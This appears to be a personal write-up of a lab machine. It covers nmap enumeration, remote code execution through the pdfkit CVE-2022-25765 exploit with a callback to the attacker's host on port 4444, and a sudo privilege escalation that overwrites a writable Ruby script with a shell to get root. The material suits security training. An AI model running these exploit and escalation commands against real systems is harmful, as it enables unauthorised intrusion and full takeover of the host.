### Enumeration
```
IP=192.168.158.22
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,3000 -A $IP
```
#### Ports 
- 22
- 3000
### Foothold
- 3000
	- Default page
		- ![[Pasted image 20240624115959.png]]
		- google: rubydome html to pdf exploit
			- pdfkit - https://github.com/UNICORDev/exploit-CVE-2022-25765
			- Exploit-db - 51293
			- python3 51293.py -s 192.168.45.195 4444 -w http://192.168.158.22:3000/pdf -p url
			- This gives us RCE
	- dirsearch -u http://$IP:3000
		- nothing
	- burpsuite request
		- /pdf
		- parameter: url
### PE
#### Linux
- id
	- uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
- sudo -l
	- (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
		- ls -la /home/andrew/app/app.rb
			- -rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 /home/andrew/app/app.rb
			- chmod 777 /home/andrew/app/app.rb
			- echo 'exec "/bin/sh"' > app.rb
			- sudo /usr/bin/ruby /home/andrew/app/app.rb
				- now rooted
	- secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,use_pty
### Lessons Learned
- Take note of the url you are trying to abuse. Can be done from burp
- Take a look at sudo -l and try to overwrite the file